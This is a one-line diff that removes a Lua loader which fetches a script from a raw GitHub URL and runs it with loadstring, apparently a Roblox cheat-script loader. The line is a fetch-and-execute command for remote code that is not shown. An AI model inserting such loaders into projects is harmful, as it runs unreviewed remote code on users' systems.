@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LOVELPY1314/WOW-Script/refs/heads/main/12cc5cc4ba2995c424b8a02cee4f87e2_6094190011580171266_m.lua"))()
